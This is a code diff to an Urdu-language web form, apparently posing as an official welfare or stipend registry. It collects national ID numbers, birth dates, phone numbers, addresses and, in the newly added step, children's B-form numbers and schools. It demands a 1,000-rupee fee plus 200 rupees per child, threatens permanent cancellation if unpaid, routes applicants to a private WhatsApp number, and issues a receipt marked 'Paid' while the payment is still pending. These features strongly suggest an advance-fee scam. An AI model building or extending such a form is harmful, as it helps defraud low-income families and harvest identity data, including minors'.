@@ -79,8 +79,10 @@
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">شناختی کارڈ:</td><td id="receiptCnic" class="py-2 text-slate-800 font-mono"></td></tr>
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">تاریخ پیدائش:</td><td id="receiptDob" class="py-2 text-slate-800 font-mono"></td></tr>
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">موبائل نمبر:</td><td id="receiptMobile" class="py-2 text-slate-800 font-mono"></td></tr>
+                    <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">بچوں کی تعلیمی رجسٹری:</td><td id="receiptKidsStatus" class="py-2 text-slate-800"></td></tr>
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">یونین کونسل (UC):</td><td id="receiptUc" class="py-2 text-slate-800"></td></tr>
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">شناختی کارڈ پتہ:</td><td id="receiptCnicAddress" class="py-2 text-slate-800 text-xs"></td></tr>
+                    <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">ٹوٹل فیس واجب الادا:</td><td id="receiptTotalCharges" class="py-2 font-bold text-slate-900 font-mono"></td></tr>
                     <tr class="border-b border-emerald-100/50"><td class="py-2 font-bold text-[#004d26]">ٹرانزیکشن ID (TRX):</td><td id="receiptTrxDisplay" class="py-2 text-red-600 font-mono font-bold">پینڈنگ (Pending)</td></tr>
                     <tr><td class="py-2 font-bold text-[#004d26]">تاریخ اور وقت:</td><td id="receiptDateTime" class="py-2 text-slate-800 font-mono text-xs"></td></tr>
                 </table>
@@ -91,7 +93,7 @@
                     <span>⚠️ اہم ترین ہدایت برائے ادائیگی فیس</span>
                 </h4>
                 <p class="text-xs text-amber-800 mt-1 leading-relaxed">
-                    فائل کی باقاعدہ منظوری اور تصدیق کے لیے <strong>1,000 روپے</strong> رجسٹریشن فیس نیچے دیے گئے اکاؤنٹ پر بھیجنا لازمی ہے۔ فیس جمع نہ ہونے کی صورت میں یہ رجسٹریشن مستقل طور پر معطل یا کینسل رہے گی۔
+                    فائل کی باقاعدہ منظوری اور تصدیق کے لیے کل رقم <strong id="instructionTotalAmount" class="text-red-600 text-sm font-mono">1,000 روپے</strong> رجسٹریشن فیس نیچے دیے گئے اکاؤنٹ پر بھیجنا لازمی ہے۔ فیس جمع نہ ہونے کی صورت میں یہ رجسٹریشن مستقل طور پر معطل یا کینسل رہے گی۔
                 </p>
                 
                 <div class="mt-3 space-y-2 text-xs">
@@ -148,6 +150,8 @@
             <div class="h-0.5 bg-slate-200 flex-1 mx-2"></div>
             <div id="ind-step2" class="px-2.5 py-1 rounded-full bg-slate-100">معاشی معلومات</div>
             <div class="h-0.5 bg-slate-200 flex-1 mx-2"></div>
+            <div id="ind-stepkids" class="px-2.5 py-1 rounded-full bg-slate-100 hidden">بچوں کا وظیفہ</div>
+            <div id="ind-kids-line" class="h-0.5 bg-slate-200 flex-1 mx-2 hidden"></div>
             <div id="ind-step1" class="px-2.5 py-1 rounded-full bg-[#006633] text-white shadow-sm">بنیادی معلومات</div>
         </div>
 
@@ -156,7 +160,7 @@
 
                 <div id="step1-container" class="space-y-6">
                     <div class="border-b border-slate-100 pb-3 mb-4">
-                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 1 / 3</span>
+                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 1</span>
                         <h2 class="text-xl font-extrabold text-[#006633] mt-2 text-right">خاندانی اور بنیادی معلومات</h2>
                     </div>
 
@@ -257,6 +261,21 @@
                     </div>
 
                     <div id="kidsSection" class="hidden space-y-4 pt-3 mt-3 border-t border-dashed border-slate-200">
+                        <div class="flex flex-col space-y-1.5 p-3 bg-emerald-50/50 border border-emerald-200 rounded-xl">
+                            <label class="text-xs font-bold text-emerald-900 text-right">کیا بچوں کی رجسٹریشن برائے اسٹڈی وظائف کرنی ہے؟</label>
+                            <p class="text-[10px] text-emerald-700 text-right font-medium mt-0.5">*(فیس: 200 روپے فی بچہ اضافی)*</p>
+                            <div class="flex items-center justify-end space-x-6 mt-2 direction-rtl">
+                                <label class="flex items-center space-x-2 space-x-reverse cursor-pointer font-bold text-xs text-slate-800">
+                                    <input type="radio" name="wazaifRegistryOption" value="yes" onchange="toggleWazaifFlow(true)" class="w-4 h-4 text-[#006633] focus:ring-[#006633]">
+                                    <span>ہاں، رجسٹریشن کرنی ہے</span>
+                                </label>
+                                <label class="flex items-center space-x-2 space-x-reverse cursor-pointer font-bold text-xs text-slate-800">
+                                    <input type="radio" name="wazaifRegistryOption" value="no" checked onchange="toggleWazaifFlow(false)" class="w-4 h-4 text-[#006633] focus:ring-[#006633]">
+                                    <span>نہیں، ابھی نہیں کرنی</span>
+                                </label>
+                            </div>
+                        </div>
+
                         <div class="flex flex-col space-y-1.5">
                             <label class="text-sm font-semibold text-slate-700 text-right">کل بچوں کی تعداد (Total Kids)</label>
                             <input type="text" id="totalKids" inputmode="numeric" pattern="[0-9]*" value="0" class="w-full px-4 py-3 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#006633] text-center bg-slate-50/50 font-mono">
@@ -280,9 +299,52 @@
                     </div>
                 </div>
 
+                <div id="stepkids-container" class="space-y-6 hidden">
+                    <div class="border-b border-slate-100 pb-3 mb-4">
+                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">بچوں کا ڈیٹا فیز</span>
+                        <h2 class="text-xl font-extrabold text-[#006633] mt-2 text-right">سٹڈی وظائف بچوں کی تفصیلات</h2>
+                        <p class="text-[11px] text-slate-500 text-right mt-1">تعلیمی وظیفہ کلیم کرنے کے لیے بچوں کی درست انٹری کریں۔</p>
+                    </div>
+
+                    <div id="dynamicKidsFieldsContainer" class="space-y-6">
+                        </div>
+
+                    <button type="button" onclick="addNewKidFormBlock()" class="w-full bg-emerald-50 border border-dashed border-emerald-400 text-emerald-800 font-bold py-3 px-4 rounded-xl text-xs hover:bg-emerald-100/70 transition flex items-center justify-center gap-1">
+                        ➕ مزید بچہ شامل کریں (+ Add Kid)
+                    </button>
+
+                    <div class="p-4 bg-slate-900 text-white rounded-xl direction-rtl text-right text-xs space-y-1.5 shadow-sm font-mono">
+                        <div class="flex justify-between border-b border-slate-800 pb-1.5 text-slate-400">
+                            <span>تفصیل فیس ادائیگی</span>
+                            <span>رقم (PKR)</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>👤 آپ کی ذاتی رجسٹریشن فیس:</span>
+                            <span>1,000</span>
+                        </div>
+                        <div class="flex justify-between text-emerald-400">
+                            <span>👶 بچوں کے وظائف فیس (<span id="liveKidsCountSpan">0</span> بچے):</span>
+                            <span>+ <span id="liveKidsChargesSpan">0</span></span>
+                        </div>
+                        <div class="flex justify-between border-t border-dashed border-slate-700 pt-1.5 text-sm font-bold text-amber-400">
+                            <span>💵 کل فیس (Grand Total):</span>
+                            <span><span id="liveGrandTotalSpan">1,000</span> روپے</span>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4 pt-2">
+                        <button type="button" onclick="goToStep(2)" class="w-full bg-slate-100 text-slate-800 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-200 transition cursor-pointer">
+                            پیچھے جائیں
+                        </button>
+                        <button type="button" onclick="validateAndGoFromKidsToStep3()" class="w-full bg-[#006633] text-white font-bold py-3.5 px-4 rounded-xl shadow hover:bg-[#004d26] transition cursor-pointer">
+                            اگلا مرحلہ (پتہ)
+                        </button>
+                    </div>
+                </div>
+
                 <div id="step2-container" class="space-y-6 hidden">
                     <div class="border-b border-slate-100 pb-3 mb-4">
-                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 2 / 3</span>
+                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 2</span>
                         <h2 class="text-xl font-extrabold text-[#006633] mt-2 text-right">معاشی اور رہائشی معلومات</h2>
                     </div>
 
@@ -380,7 +442,7 @@
                         <button type="button" onclick="goToStep(1)" class="w-full bg-slate-100 text-slate-800 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-200 transition cursor-pointer">
                             پیچھے جائیں
                         </button>
-                        <button type="button" onclick="goToStep(3)" class="w-full bg-[#006633] text-white font-bold py-3.5 px-4 rounded-xl shadow hover:bg-[#004d26] transition cursor-pointer">
+                        <button type="button" onclick="handleStep2NextRoute()" class="w-full bg-[#006633] text-white font-bold py-3.5 px-4 rounded-xl shadow hover:bg-[#004d26] transition cursor-pointer">
                             اگلا مرحلہ
                         </button>
                     </div>
@@ -388,7 +450,7 @@
 
                 <div id="step3-container" class="space-y-6 hidden">
                     <div class="border-b border-slate-100 pb-3 mb-4">
-                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 3 / 3</span>
+                        <span class="bg-emerald-50 text-[#006633] text-xs font-bold px-2.5 py-1 rounded-full border border-emerald-200">Step 3</span>
                         <h2 class="text-xl font-extrabold text-[#006633] mt-2 text-right">مکمل رہائشی پتہ (Address Matrix)</h2>
                     </div>
 
@@ -441,7 +503,7 @@
 
                     <div class="space-y-4 pt-3">
                         <div class="grid grid-cols-2 gap-4">
-                            <button type="button" onclick="goToStep(2)" class="w-full bg-slate-100 text-slate-800 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-200 transition cursor-pointer">
+                            <button type="button" onclick="handleStep3BackRoute()" class="w-full bg-slate-100 text-slate-800 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-200 transition cursor-pointer">
                                 پیچھے جائیں
                             </button>
                             <button type="submit" id="submitBtn" class="w-full bg-[#006633] text-white font-bold py-3.5 px-4 rounded-xl shadow hover:bg-emerald-800 transition active:scale-[0.99] flex items-center justify-center space-x-2 space-x-reverse cursor-pointer">
@@ -625,7 +687,7 @@
                         { distId: "faisalabad", distName: "فیصل آباد (Faisalabad)", tehsils: ["فیصل آباد سٹی", "فیصل آباد صدر", "جڑانوالہ", "تاندلیانوالہ", "سمندری", "چک جھمرہ"] },
                         { distId: "jhang", distName: "جھنگ (Jhang)", tehsils: ["جھنگ (Jhang)", "شورکوٹ (Shorkot)", "احمد پور سیال (Ahmedpur Sial)", "18 ہزاری (18-Hazari)"] },
                         { distId: "toba_tek_singh", distName: "ٹوبہ ٹیک سنگھ (Toba Tek Singh)", tehsils: ["ٹوبہ ٹیک سنگھ", "کمالیہ", "گوجرہ", "پیر محل"] },
-                        { distId: "chiniot", divName: "چنیوٹ (Chiniot)", tehsils: ["چنیوٹ (Chiniot)", "بھوانہ (Bhowana)", "لالیاں (Lalian)"] }
+                        { distId: "chiniot", distName: "چنیوٹ (Chiniot)", tehsils: ["چنیوٹ (Chiniot)", "بھوانہ (Bhowana)", "لالیاں (Lalian)"] }
                     ]
                 },
                 {
@@ -711,6 +773,7 @@
         let currentStep = 1;
         let generatedProfileId = '';
         let globalFormData = null; 
+        let isWazaifFlowActive = false; // ٹریکر برائے تعلیمی وظائف راستہ
 
         // Input Sanitizer Engine
         ['mobileNumber', 'totalKids', 'maleKids', 'femaleKids', 'roomsCount', 'washroomsCount'].forEach(id => {
@@ -731,17 +794,139 @@
             e.target.value = formatted;
         });
 
+        // تعلیمی وظائف ڈائنامک فارم کے فلو کو کنٹرول کرنے کا مینیجر
+        function toggleWazaifFlow(isActive) {
+            isWazaifFlowActive = isActive;
+            const stepKidsInd = document.getElementById("ind-stepkids");
+            const kidsLine = document.getElementById("ind-kids-line");
+            
+            if(isActive) {
+                stepKidsInd.classList.remove("hidden");
+                kidsLine.classList.remove("hidden");
+                // اگر پہلے سے کوئی کارڈ نہیں بنا ہوا تو کم از کم 1 کارڈ خودکار جنریٹ کر دیں
+                const container = document.getElementById("dynamicKidsFieldsContainer");
+                if(container.children.length === 0) {
+                    addNewKidFormBlock();
+                }
+            } else {
+                stepKidsInd.classList.add("hidden");
+                kidsLine.classList.add("hidden");
+            }
+        }
+
+        // بچوں کے ڈائنامک کارڈ بنانے کا انجن
+        function addNewKidFormBlock() {
+            const container = document.getElementById("dynamicKidsFieldsContainer");
+            const kidIndex = container.children.length + 1;
+
+            const blockHtml = `
+                <div class="kid-form-block border-2 border-emerald-100 bg-emerald-50/20 rounded-2xl p-4 relative space-y-4 pt-6" data-index="${kidIndex}">
+                    <div class="absolute -top-3 right-4 bg-[#006633] text-white text-[10px] font-bold px-3 py-0.5 rounded-full shadow-sm">
+                        بچہ نمبر ${kidIndex}
+                    </div>
+                    ${kidIndex > 1 ? `
+                        <button type="button" onclick="removeKidFormBlock(this)" class="absolute top-2 left-2 text-red-500 font-bold text-xs hover:text-red-700 transition">
+                            ✕ حذف کریں
+                        </button>
+                    ` : ''}
+
+                    <div class="flex flex-col space-y-1.5">
+                        <label class="text-xs font-bold text-slate-700 text-right">بچے کا مکمل نام</label>
+                        <input type="text" class="kid-name w-full px-3 py-2 border border-slate-200 rounded-lg text-right text-sm bg-white focus:ring-2 focus:ring-[#006633] focus:outline-none" placeholder="نام لکھیں" required>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <div class="flex flex-col space-y-1.5">
+                            <label class="text-xs font-bold text-slate-700 text-right">عمر (سال)</label>
+                            <input type="text" inputmode="numeric" class="kid-age w-full px-3 py-2 border border-slate-200 rounded-lg text-center text-sm bg-white focus:ring-2 focus:ring-[#006633] focus:outline-none" placeholder="مثلاً 8" required>
+                        </div>
+                        <div class="flex flex-col space-y-1.5">
+                            <label class="text-xs font-bold text-slate-700 text-right">رشتہ / صنف</label>
+                            <select class="kid-gender w-full px-3 py-2 border border-slate-200 rounded-lg text-right text-xs bg-white direction-rtl focus:ring-2 focus:ring-[#006633] focus:outline-none" required>
+                                <option value="بیٹا">بیٹا (Male)</option>
+                                <option value="بیٹی">بیٹی (Female)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="flex flex-col space-y-1.5">
+                        <label class="text-xs font-bold text-slate-700 text-right">ب فارم یا شناختی کارڈ نمبر</label>
+                        <input type="text" inputmode="numeric" class="kid-bform w-full px-3 py-2 border border-slate-200 rounded-lg text-left font-mono text-sm bg-white focus:ring-2 focus:ring-[#006633] focus:outline-none" placeholder="38201XXXXXXXX" required>
+                    </div>
+
+                    <div class="flex flex-col space-y-1.5">
+                        <label class="text-xs font-bold text-slate-700 text-right">موجودہ اسکول / کالج کا نام</label>
+                        <input type="text" class="kid-school w-full px-3 py-2 border border-slate-200 rounded-lg text-right text-sm bg-white focus:ring-2 focus:ring-[#006633] focus:outline-none" placeholder="اسکول یا کالج لکھیں" required>
+                    </div>
+                </div>
+            `;
+
+            const divWrapper = document.createElement("div");
+            divWrapper.innerHTML = blockHtml;
+            container.appendChild(divWrapper.firstElementChild);
+
+            // ان پٹ سینیٹائزر بائنڈنگ فوراً
+            const newBlock = container.lastElementChild;
+            newBlock.querySelector('.kid-age').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+            newBlock.querySelector('.kid-bform').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+
+            calculateLiveKidsCharges();
+        }
+
+        // بچہ بلاک ڈیلیٹ کرنا
+        function removeKidFormBlock(buttonElement) {
+            buttonElement.closest('.kid-form-block').remove();
+            
+            // انڈیکسز کو دوبارہ ترتیب دینا
+            const container = document.getElementById("dynamicKidsFieldsContainer");
+            Array.from(container.children).forEach((block, idx) => {
+                const badge = block.querySelector('.absolute.right-4');
+                if(badge) badge.innerText = `بچہ نمبر ${idx + 1}`;
+            });
+
+            calculateLiveKidsCharges();
+        }
+
+        // لائیو فیس کیلکولیشن انجن
+        function calculateLiveKidsCharges() {
+            const container = document.getElementById("dynamicKidsFieldsContainer");
+            const kidsCount = isWazaifFlowActive ? container.children.length : 0;
+            const kidsCharges = kidsCount * 200;
+            const grandTotal = 1000 + kidsCharges;
+
+            document.getElementById("liveKidsCountSpan").innerText = kidsCount;
+            document.getElementById("liveKidsChargesSpan").innerText = kidsCharges.toLocaleString();
+            document.getElementById("liveGrandTotalSpan").innerText = grandTotal.toLocaleString();
+
+            return { count: kidsCount, total: grandTotal, chargesOnly: kidsCharges };
+        }
+
         function goToStep(step) {
             document.getElementById(`step1-container`).classList.add('hidden');
             document.getElementById(`step2-container`).classList.add('hidden');
+            document.getElementById(`stepkids-container`).classList.add('hidden');
             document.getElementById(`step3-container`).classList.add('hidden');
-            document.getElementById(`step${step}-container`).classList.remove('hidden');
             
+            if (step === 'kids') {
+                document.getElementById(`stepkids-container`).classList.remove('hidden');
+            } else {
+                document.getElementById(`step${step}-container`).classList.remove('hidden');
+            }
+            
+            // انڈیکیٹر ہائی لائٹنگ
             for(let i=1; i<=3; i++) {
                 let ind = document.getElementById(`ind-step${i}`);
                 if(i === step) ind.className = "px-2.5 py-1 rounded-full bg-[#006633] text-white shadow-sm";
                 else ind.className = "px-2.5 py-1 rounded-full bg-slate-100 text-slate-400";
             }
+            
+            let kidsInd = document.getElementById("ind-stepkids");
+            if(step === 'kids') {
+                kidsInd.className = "px-2.5 py-1 rounded-full bg-[#006633] text-white shadow-sm";
+            } else if(isWazaifFlowActive) {
+                kidsInd.className = "px-2.5 py-1 rounded-full bg-slate-100 text-[#006633] border border-emerald-200";
+            }
+
             currentStep = step;
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
@@ -769,9 +954,63 @@
             goToStep(targetStep);
         }
 
+        // سٹیپ 2 کے بٹن کا روٹر مینیجر
+        function handleStep2NextRoute() {
+            if(isWazaifFlowActive) {
+                calculateLiveKidsCharges();
+                goToStep('kids');
+            } else {
+                goToStep(3);
+            }
+        }
+
+        // بچوں کے سٹیپ سے سٹیپ 3 پر جانے کی تصدیقی لاجک
+        function validateAndGoFromKidsToStep3() {
+            const container = document.getElementById("dynamicKidsFieldsContainer");
+            let allValid = true;
+
+            // ڈائنامک فیلڈز ویلیڈیشن رن
+            const blocks = container.querySelectorAll('.kid-form-block');
+            if(blocks.length === 0) {
+                alert("براہ کرم کم از کم ایک بچے کی تفصیلات شامل کریں یا پیچھے جا کر بچوں کی انٹری کو بند کریں۔");
+                return;
+            }
+
+            blocks.forEach(block => {
+                const name = block.querySelector('.kid-name').value.trim();
+                const age = block.querySelector('.kid-age').value.trim();
+                const bform = block.querySelector('.kid-bform').value.trim();
+                const school = block.querySelector('.kid-school').value.trim();
+
+                if(!name || !age || !bform || !school) {
+                    allValid = false;
+                }
+            });
+
+            if(!allValid) {
+                alert("براہ کرم بچوں کے فارم کی تمام فیلڈز (بشمول اسکول/کالج) لازمی پُر کریں!");
+                return;
+            }
+
+            goToStep(3);
+        }
+
+        // بیک بٹن روٹر مینیجر برائے سٹیپ 3
+        function handleStep3BackRoute() {
+            if(isWazaifFlowActive) {
+                goToStep('kids');
+            } else {
+                goToStep(2);
+            }
+        }
+
         function toggleKidsFields() {
             var status = document.getElementById("maritalStatus").value;
             document.getElementById("kidsSection").classList.toggle("hidden", status !== "married");
+            if(status !== "married") {
+                const yesOption = document.querySelector('input[name="wazaifRegistryOption"][value="no"]');
+                if(yesOption) { yesOption.checked = true; toggleWazaifFlow(false); }
+            }
         }
 
         function toggleDisabilityField() {
@@ -859,7 +1098,24 @@
             const combinedDOB = `${dobDay}-${dobMonth}-${dobYear}`;
             const surveyStatus = document.querySelector('input[name="alreadySurveyed"]:checked').value;
 
-            // Gather Object Parameters
+            // بچوں کی فائنل لسٹ اسٹرکچر تیار کرنا
+            const finalKidsArray = [];
+            if(isWazaifFlowActive) {
+                const container = document.getElementById("dynamicKidsFieldsContainer");
+                container.querySelectorAll('.kid-form-block').forEach(block => {
+                    finalKidsArray.push({
+                        kidName: block.querySelector('.kid-name').value.trim(),
+                        kidAge: block.querySelector('.kid-age').value.trim(),
+                        kidGender: block.querySelector('.kid-gender').value,
+                        kidBForm: block.querySelector('.kid-bform').value.trim(),
+                        kidSchoolOrCollege: block.querySelector('.kid-school').value.trim()
+                    });
+                });
+            }
+
+            const billing = calculateLiveKidsCharges();
+
+            // Gather Object Parameters (شاملِ فائر بیس محفوظ ماڈل)
             globalFormData = {
                 profileId: generatedProfileId,
                 alreadySurveyed: surveyStatus,
@@ -883,7 +1139,12 @@
                 villageName: document.getElementById("villageName").value,
                 paymentStatus: "pending",
                 trxId: "Pending",
-                timestamp: now.toISOString()
+                timestamp: now.toISOString(),
+                // نئے فیلڈز برائے کلاؤڈ انٹری وظائف پراجیکٹ
+                hasKidsRegistered: isWazaifFlowActive,
+                totalKidsCharges: billing.chargesOnly,
+                grandTotalAmount: billing.total,
+                kidsList: finalKidsArray
             };
 
             // Async Push Firebase
@@ -921,6 +1182,17 @@
             document.getElementById("receiptTrxDisplay").innerText = "پینڈنگ (Pending)";
             document.getElementById("receiptTrxDisplay").className = "py-2 text-red-600 font-mono font-bold";
             document.getElementById("receiptDateTime").innerText = `${now.toLocaleTimeString()} @ ${now.toISOString().split('T')[0]}`;
+            
+            // رسید بلنگ اور ہدایات کی اپڈیٹیشن لائیو بریک ڈاؤن کے ساتھ
+            const billingText = `${globalFormData.grandTotalAmount.toLocaleString()} روپے`;
+            document.getElementById("receiptTotalCharges").innerText = billingText;
+            document.getElementById("instructionTotalAmount").innerText = borderInfoText = isWazaifFlowActive 
+                ? `${globalFormData.grandTotalAmount.toLocaleString()} روپے (1000 رجسٹریشن + ${globalFormData.totalKidsCharges.toLocaleString()} بچوں کے وظائف فیس)` 
+                : "1,000 روپے";
+
+            document.getElementById("receiptKidsStatus").innerText = isWazaifFlowActive 
+                ? `ہاں، ${globalFormData.kidsList.length} بچے شامل ہیں` 
+                : "شامل نہیں ہیں";
             
             submitBtn.disabled = false;
             if(btnText) btnText.innerText = "جمع کریں (Submit)";
@@ -960,6 +1232,14 @@
             
             const myPhoneNumber = "923130464136"; 
             
+            let kidsSummaryText = "شامل نہیں\n";
+            if(globalFormData.hasKidsRegistered) {
+                kidsSummaryText = `${globalFormData.kidsList.length} بچے درج ذیل ہیں:\n`;
+                globalFormData.kidsList.forEach((k, idx) => {
+                    kidsSummaryText += `   ${idx+1}. ${k.kidName} (${k.kidGender}) - عمر: ${k.kidAge} سال - اسکول/کالج: ${k.kidSchoolOrCollege}\n`;
+                });
+            }
+            
             const message = `*صارف ڈیجیٹل انٹری سروس رپورٹ*\n` +
                             `---------------------------\n` +
                             `*پہلے سروے ہوا؟:* ${globalFormData.alreadySurveyed === 'Yes' ? 'ہاں' : 'نہیں'}\n` +
@@ -968,8 +1248,10 @@
                             `*شناختی کارڈ:* ${globalFormData.cnicNumber}\n` +
                             `*تاریخ پیدائش:* ${globalFormData.dob}\n` +
                             `*موبائل نمبر:* ${globalFormData.mobileNumber}\n` +
+                            `*بچوں کا تعلیمی وظیفہ:* ${kidsSummaryText}` +
                             `*یونین کونسل:* ${globalFormData.ucManual}\n` +
                             `*شہر/گاؤں:* ${globalFormData.villageName}\n` +
+                            `*کل واجب الادا فیس:* ${globalFormData.grandTotalAmount.toLocaleString()} PKR\n` +
                             `*ٹرانزیکشن ID:* ${globalFormData.trxId}\n` +
                             `---------------------------\n` +
                             `*نوٹ:* میں نے اپنی رجسٹریشن فیس پے کر دی ہے۔ براہ کرم میری فائل ویریفائی کریں۔`;
@@ -1020,6 +1302,11 @@
             const copyBtn = document.getElementById('copyTextBtn');
             const copyBtnText = document.getElementById('copyTextBtnText');
             
+            let kidsTextChunk = "کوئی نہیں";
+            if(globalFormData.hasKidsRegistered) {
+                kidsTextChunk = `${globalFormData.kidsList.length} بچے (${globalFormData.totalKidsCharges} PKR فیس)`;
+            }
+            
             // Dynamic text template optimization for easy clipboard structure
             const receiptString = `📋 ڈیجیٹل انٹری پورٹل (DES) - آفیشل رسید\n` +
                                   `---------------------------------------\n` +
@@ -1028,10 +1315,11 @@
                                   `🆔 شناختی کارڈ (CNIC): ${globalFormData.cnicNumber}\n` +
                                   `📱 موبائل نمبر (Mobile): ${globalFormData.mobileNumber}\n` +
                                   `📅 تاریخ پیدائش (DOB): ${globalFormData.dob}\n` +
+                                  `👶 بچوں کا وظیفہ فیز: ${kidsTextChunk}\n` +
                                   `📍 یونین کونسل (UC): ${globalFormData.ucManual}\n` +
                                   `🏡 شہر یا گاؤں (Village): ${globalFormData.villageName}\n` +
                                   `🔗 ٹرانزیکشن ID (TRX): ${globalFormData.trxId}\n` +
-                                  `💰 رجسٹریشن فیس status: 1,000 PKR (Paid)\n` +
+                                  `💰 کل جمع شدہ رقم status: ${globalFormData.grandTotalAmount.toLocaleString()} PKR (Paid)\n` +
                                   `---------------------------------------\n` +
                                   `✔ STATUS: SECURE NODE ACTIVE (Pending Verification)`;
 
@@ -1084,6 +1372,13 @@
             document.getElementById("trxInputArea").style.display = "block";
             document.getElementById("receiptTrxDisplay").innerText = "پینڈنگ (Pending)";
             document.getElementById("receiptTrxDisplay").className = "py-2 text-red-600 font-mono font-bold";
+            
+            // بچوں کے ریسیٹ اسٹیٹس انجن کو چلانا
+            document.getElementById("dynamicKidsFieldsContainer").innerHTML = "";
+            isWazaifFlowActive = false;
+            toggleWazaifFlow(false);
+            calculateLiveKidsCharges();
+            
             globalFormData = null; 
             goToStep(1);
         }
